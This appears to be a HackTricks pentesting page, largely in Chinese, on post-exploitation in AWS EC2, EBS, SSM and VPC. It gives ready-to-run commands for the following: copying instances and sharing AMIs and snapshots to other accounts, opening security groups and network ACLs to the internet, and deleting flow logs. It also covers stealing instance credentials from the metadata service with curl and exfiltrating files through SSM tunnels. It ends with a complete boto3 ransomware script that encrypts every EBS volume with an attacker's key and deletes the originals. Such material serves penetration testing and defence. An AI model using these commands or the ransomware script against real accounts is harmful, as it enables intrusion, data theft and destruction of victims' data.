# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

更多信息请参见：

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring 会在无需在实例上安装任何东西的情况下，复制 VPC 内 EC2 实例的入站和出站流量。这个被复制的流量通常会发送到类似网络入侵检测系统 (IDS) 的设备进行分析和监控。\
攻击者可以滥用此功能来捕获所有流量并从中获取敏感信息：

欲了解更多，请参见此页面：

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances 通常包含某种敏感信息。存在不同的方法可以进入（check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)）。然而，另一种检查其内容的方法是 **create an AMI and run a new instance (even in your own account) from it**：
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, which usually will contain **sensitive information**, therefore checking them should disclose this information.\
如果你发现一个 **volume without a snapshot**，你可以：**Create a snapshot** 并执行下面的操作，或者直接在该账号内将它 **mount it in an instance**：

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

使用 `CreateStoreImageTask` 将一个 EC2 AMI 直接导出到 S3，以获取未通过 snapshot 共享的原始磁盘镜像。这样可以进行完整的离线取证或 data theft，同时保持实例网络不被触及。

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

将 io1/io2 Multi-Attach volume 附加到第二个实例并以只读方式挂载，从而在不创建 snapshots 的情况下窃取实时数据。当目标 volume 已在同一 AZ 启用 Multi-Attach 时特别有用。

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

创建一个 EC2 Instance Connect Endpoint，授权 ingress，并注入临时的 SSH keys，通过受管的隧道访问私有实例。可在不打开公网端口的情况下快速实现横向移动。

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

将受害者 ENI 的 secondary private IP 移到攻击者控制的 ENI 上，以冒充被 IP 列入 allowlist 的受信任主机。可绕过基于特定地址的内部 ACLs 或 SG 规则。

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

将 Elastic IP 从受害实例重新关联到攻击者，以拦截入站流量或发起看起来源自受信任公网 IP 的出站连接。

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

如果 security group 规则引用了 customer-managed prefix list，向该列表添加攻击者的 CIDRs 会在不修改 SG 本体的情况下，静默地扩展对所有依赖规则的访问。

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

创建 gateway 或 interface VPC endpoints，以从被隔离的子网恢复出站访问。利用 AWS-managed private links 可以绕过缺失的 IGW/NAT 控制以进行 data exfiltration。

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

拥有 ec2:AuthorizeSecurityGroupIngress 权限的攻击者可以向 security groups 添加入站规则（例如允许 tcp:80 来自 0.0.0.0/0），从而将内部服务暴露到 public Internet 或其他未授权网络。
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
拥有 `ec2:ReplaceNetworkAclEntry`（或类似）权限的攻击者可以修改子网的 Network ACLs (NACLs)，使其变得非常宽松 —— 例如在关键端口上允许 0.0.0.0/0 —— 从而将整个子网范围暴露给 Internet 或未授权的网络段。与按实例应用的 Security Groups 不同，NACLs 在子网级别应用，因此更改一个受限的 NACL 可能会产生更大的影响范围，使更多主机获得访问权限。
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

拥有 ec2:Delete* 和 iam:Remove* 权限的攻击者可以删除关键基础设施资源和配置——例如 key pairs、launch templates/versions、AMIs/snapshots、volumes or attachments、security groups or rules、ENIs/network endpoints、route tables、gateways 或 managed endpoints。 这可能导致立即的服务中断、数据丢失以及取证证据的丢失。

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

将 VPC Flow Logs 指向攻击者控制的 S3 bucket，以在受害者账户之外持续收集网络元数据（源/目的地、端口），用于长期侦察。

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

即使你将 EC2 锁定以阻止外发流量，它仍然可以 **exfil via DNS**。

- **VPC Flow Logs 不会记录这种情况**。
- 你无法访问 AWS 的 DNS 日志。
- 通过将 "enableDnsSupport" 设置为 false 来禁用它，命令：

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

攻击者可以调用其控制的账户的 API endpoints。Cloudtrail 会记录这些调用，攻击者能够在 Cloudtrail 日志中看到 exfiltrate data。

### Open Security Group

通过像下面这样开放端口，你可以进一步访问网络服务：
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

可以运行一个 EC2 实例并将其注册为用于运行 ECS 实例，然后窃取 ECS 实例的数据。

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

在运行于 EC2 container instance 的任意 ECS task 内部遭到入侵，通常足以转向主机角色并获取与该节点上所有其他任务相关联的 IAM 角色。因为对 ECS-on-EC2 来说**没有任务隔离**，每个任务默认都可以查询 EC2 Instance Metadata Service (IMDS)、窃取 container instance profile，然后使用 ECS agent 与 control plane 通信时使用的相同 WebSocket 协议（即 **ECScape** 原语）请求该主机上当前调度的每个任务的凭证。Latacora 在他们的 [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/) 中记录了该工作流程，下面的进攻性摘要对其进行了浓缩。

#### Attack chain

1. **从容器内部窃取 instance profile。** 假设需要 IMDSv2，因此先请求一个 token，然后获取 profile。

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **使用 container instance role 冒充 ECS agent。** 使用这些凭证，你可以与 ECS agent 使用的未记录 WebSocket 通道通信；control plane 会把你当作真实 agent 并向你的进程下发**所有任务的 IAM 凭证**。你现在可以在本地运行更高权限的任务、导出任务环境中的 secrets，或更新 services/tasks 以重新部署你可以完全检查的工作负载。

#### IMDS reachability with IMDSv2 + hop limit 1

将 IMDSv2 设置为 `HttpTokens=required` 且 `HttpPutResponseHopLimit=1` 只会阻止位于额外跳数（Docker bridge）之后的任务。其他网络模式仍然与 Nitro controller 保持一跳之内，仍能接收到响应：

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | 每个任务都有自己的 ENI，仍然距离 IMDS 一跳，因此 tokens 和 metadata 响应能够成功到达。 |
| `host` | ✅ | 任务共享主机命名空间，因此它们看到的跳数与 EC2 实例相同。 |
| `bridge` | ❌ | 响应在 Docker bridge 上中断，因为额外的跳数耗尽了 hop limit。 |

因此，**切勿假设 hop limit 1 可以保护 awsvpc 或 host-mode 工作负载**——始终在容器内部进行测试。

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** 安全组、NACL 或路由调整无法阻止 link-local 地址 169.254.169.254，因为 Nitro 在主机上注入了它。检查 `/etc/ecs/ecs.config` 中是否存在 `ECS_AWSVPC_BLOCK_IMDS=true`。如果该标志缺失（默认），你可以直接从任务内 curl IMDS。如果设置了该标志，则需要转入 host/agent namespace 将其改回，或在 awsvpc 之外执行你的工具。

- **bridge mode:** 当 metadata 请求失败且已配置 hop limit 1 时，防御方很可能插入了一个 `DOCKER-USER` 的 drop 规则，例如 `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`。列出 `iptables -S DOCKER-USER` 即可发现该规则，获得 root 权限后你可以在查询 IMDS 之前删除或重排该规则。

- **host mode:** 检查 agent 配置中是否有 `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`。该设置会完全移除任务的 IAM 角色，因此你必须要么重新启用它，要么切换到 awsvpc 任务，或者通过主机上的另一个进程窃取凭证。当该值为 `true`（默认）时，所有 host-mode 进程——包括被攻陷的容器——都能访问 IMDS，除非存在专门针对 `169.254.169.254` 的 eBPF/cgroup 过滤；搜索引用该地址的 tc/eBPF 程序或 iptables 规则。

Latacora 甚至发布了 [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) ，你可以将其放入目标账户以枚举哪些网络模式仍暴露 metadata，并据此规划下一步操作。

一旦你弄清楚哪些模式暴露 IMDS，就可以规划后渗透路径：针对任意 ECS 任务，请求 instance profile，冒充 agent，并收集其他每个任务的角色以在集群内进行横向移动或持久化。

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

所需权限：

- `ssm:StartSession`

除了命令执行外，SSM 还允许 traffic tunneling，这可以被滥用来从因 Security Groups 或 NACLs 而没有网络访问的 EC2 实例进行 pivot。
其中一个有用的场景是从 [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) pivoting 到私有 EKS cluster。

> 要启动会话你需要安装 SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. 在你的机器上安装 SessionManagerPlugin
2. 使用以下命令登录 Bastion EC2：
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. 使用 [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) 脚本获取 Bastion EC2 的 AWS 临时凭证  
4. 将凭证传到你自己的机器，在 `$HOME/.aws/credentials` 文件中作为 `[bastion-ec2]` 配置档案  
5. 以 Bastion EC2 身份登录到 EKS：
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. 将 `$HOME/.kube/config` 文件中的 `server` 字段更新为指向 `https://localhost`  
7. 创建一个 SSM 隧道，方法如下：
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. 来自 `kubectl` 工具的流量现在通过 Bastion EC2 的 SSM 隧道转发，您可以在本机运行以下命令访问私有 EKS 集群：
```shell
kubectl get pods --insecure-skip-tls-verify
```
注意：除非你设置 `--insecure-skip-tls-verify` 标志（或在 K8s 审计工具中使用等效设置），否则 SSL 连接会失败。由于流量通过安全的 AWS SSM 隧道传输，你免受任何类型的 MitM 攻击。

最后，这种技术并不限于攻击私有 EKS 集群。你可以设置任意域名和端口来 pivot 到任何其他 AWS 服务或自定义应用。

---

#### 快速 本地 ↔️ 远程 端口转发 (AWS-StartPortForwardingSession)

如果你只需要将 **一个 TCP 端口从 EC2 实例转发到你的本地主机**，可以使用 `AWS-StartPortForwardingSession` SSM 文档（不需要远程主机参数）：
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
The command establishes a bidirectional tunnel between your workstation (`localPortNumber`) and the selected port (`portNumber`) on the instance **without opening any inbound Security-Group rules**。

常见用例：

* **File exfiltration**
1. 在实例上启动一个指向你想要 exfiltrate 的目录的简易 HTTP 服务器：

```bash
python3 -m http.server 8000
```

2. 从你的工作站通过 SSM 隧道获取文件：

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Accessing internal web applications (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
提示：在 exfiltrating 之前压缩并加密证据，以便 CloudTrail 不会记录明文内容:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### 共享 AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### 在公共和私有 AMIs 中搜索敏感信息

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel 是一个工具，旨在 **在公共或私有 Amazon Machine Images (AMIs) 中搜索敏感信息**。它自动化了从目标 AMIs 启动实例、挂载其卷，并扫描潜在 secrets 或敏感数据的过程。

### 共享 EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

这是一个概念验证，与 S3 post-exploitation notes 中演示的 Ransomware 演示类似。KMS 应该被称为 RMS（Ransomware Management Service），因为它可以如此轻松地用于对各种 AWS 服务进行加密。

首先，从一个 'attacker' AWS 账户，在 KMS 中创建一个 customer managed key。对于本示例，我们让 AWS 为我管理密钥数据，但在现实场景中，恶意行为者会将密钥数据保留在 AWS 控制之外。更改 key policy，以允许任何 AWS 账户 Principal 使用该密钥。对于该 key policy，账户名为 'AttackSim'，允许全部访问的策略规则名为 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
要允许使用该密钥来加密一个 EBS 卷，密钥策略规则需要启用以下权限：

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

现在有了可公开访问的密钥可以使用。我们可以使用一个有一些启动并附加了未加密 EBS 卷的 EC2 实例的 'victim' 账户。该 'victim' 账户的 EBS 卷就是我们要加密的目标；此攻击假定已经入侵了一个高权限的 AWS 账户。

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

类似于 S3 勒索软件示例。此攻击会使用 snapshots 为附加的 EBS 卷创建副本，使用 'attacker' 账户中公开可用的密钥对新的 EBS 卷进行加密，然后从 EC2 实例分离并删除原始 EBS 卷，最后删除用于创建新加密 EBS 卷的 snapshots。 ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

最终该账户中只剩下已加密的 EBS 卷。

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

值得注意的是，脚本停止了 EC2 实例以分离并删除原始 EBS 卷。原始未加密的卷现在已经不存在了。

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

接下来，回到 'attacker' 账户的密钥策略中，从密钥策略中移除 'Outside Encryption' 策略规则。
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
等一会儿，等待新设置的密钥策略生效。然后返回到 'victim' 账户并尝试附加一个新加密的 EBS 卷。你会发现可以附加该卷。

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

但是，当你尝试用该已加密的 EBS 卷实际启动 EC2 实例时，它会失败，并从 'pending' 状态一直回到 'stopped' 状态，因为所附的 EBS 卷无法使用该密钥解密，原因是密钥策略不再允许。

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

下面是所使用的 python 脚本。它接受针对 'victim' 账户的 AWS creds 和用于加密的公开可用 AWS ARN 值。脚本会对目标 AWS 账户中所有 EC2 实例所挂载的所有可用 EBS 卷制作加密副本，然后停止每台 EC2 实例，分离原始 EBS 卷并删除它们，最后删除过程中使用的所有 snapshots。这样目标 'victim' 账户中将只剩下加密的 EBS 卷。仅在测试环境中使用该脚本，因其具有破坏性，会删除所有原始 EBS 卷。你可以使用所使用的 KMS key 通过 snapshots 恢复它们并还原到原始状态，但需要提醒的是，这归根结底是一个 ransomware PoC。
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## 参考资料

- [Latacora - ECS on EC2: Covering Gaps in IMDS Hardening](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
